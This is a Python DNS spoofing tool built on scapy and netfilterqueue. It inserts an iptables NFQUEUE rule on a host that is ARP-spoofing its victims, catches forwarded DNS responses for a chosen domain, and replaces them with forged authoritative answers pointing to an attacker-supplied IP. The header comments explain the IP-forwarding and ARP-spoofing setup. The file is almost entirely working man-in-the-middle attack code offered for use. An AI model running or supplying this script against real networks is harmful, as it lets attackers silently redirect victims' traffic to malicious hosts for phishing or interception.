#!/usr/bin/python
############################################################
# Requirements:
# pip install scapy
# pip install netfilterqueue
#
# Remember: Enable Kernel Routing 
#    You shoud do ARP Spoof for this script
#    echo 1 > /proc/sys/net/ipv4/ip_forward
#    iptables -I FORWARD -p udp --sport 53 -j NFQUEUE --queue-num 1
#    iptables -L -nv
############################################################
from scapy.all import *
import threading
import argparse
import os
import datetime
import binascii
from termcolor import colored
from netfilterqueue import NetfilterQueue
import os

# To stop scapy from checking return packet originating from any packet that we have sent out
conf.checkIPaddr=False

# Disable default scapy output
conf.verb = 0

# Arguments
parser = argparse.ArgumentParser()
parser.add_argument('-dns', '--dns-name-to-spoof', required=True, action='store', dest='spoofDomain', help='Domain to spoof')
parser.add_argument('-ip', '--spoofed-address', required=True, action='store', dest='spoofResolvedIp',help='Address to reply for spoofed domain')
args = parser.parse_args()

spoofDomain = str(args.spoofDomain)
spoofResolvedIp = str(args.spoofResolvedIp)

# Header
print ('###[ DNS Spoofer ]###')
print ('###[ Version 0.5 ]###')
print ('###[ Date 22/04/2020 ]###')
print ('###[ by Bruno Botelho - bruno.botelho.br@gmail.com ]###')
print ('')
print (' Remember: This script does not do automatically arp spoof, you shoul do it mannualy.')
print ('')

def enable_nfqueue_53():
    print('###[ Enable IP Tables Rule ]###')
    cmd = ('iptables -I FORWARD -p udp --sport 53 -j NFQUEUE --queue-num 1')
    os.system(cmd)

def denable_nfqueue_53():
    print('###[ Disable IP Tables Rule ]###')
    cmd = ('iptables -D FORWARD -p udp --sport 53 -j NFQUEUE --queue-num 1')
    os.system(cmd)

def log_timestamp():
    return datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")

def dnsSpoof(pkt):
    scapy_packet = IP(pkt.get_payload())
    if ((scapy_packet.haslayer(DNS)) and (scapy_packet[DNS].qd.qname == (spoofDomain + '.'))):
        print ('###[ ' + log_timestamp() + ' Spoofing DNS response ' + colored(spoofDomain,'red') + ' to ' + colored(spoofResolvedIp,'red') + ' ]###')
        ip = IP(src=scapy_packet[IP].src, dst=scapy_packet[IP].dst)
        udp = UDP(sport=scapy_packet[UDP].sport, dport=scapy_packet[UDP].dport)
        dns = DNS(id=scapy_packet[DNS].id, qr=1, aa=1, qd=scapy_packet[DNS].qd,an=DNSRR(rrname=scapy_packet[DNS].qd.qname, ttl=10, rdata=spoofResolvedIp))
        spoofed_pkt = ip / udp / dns
        send(spoofed_pkt)
        pkt.set_payload(str(spoofed_pkt))
        pkt.drop()
    else:
        print ('###[ ' + log_timestamp() + ' Not in scope DNS response ' + colored(str(scapy_packet[DNS].qd.qname),'green') + ' ]###')
        pkt.accept()

print ('###[ Intercepting nfqueue: 1 ]###')
print ('###[ ' + log_timestamp() + 'Spoofing ' + spoofDomain + ' to ' + spoofResolvedIp +  ' ]###')   
enable_nfqueue_53()
nfqueue = NetfilterQueue()
nfqueue.bind(1, dnsSpoof)
try:
    nfqueue.run()
except KeyboardInterrupt:
    denable_nfqueue_53()
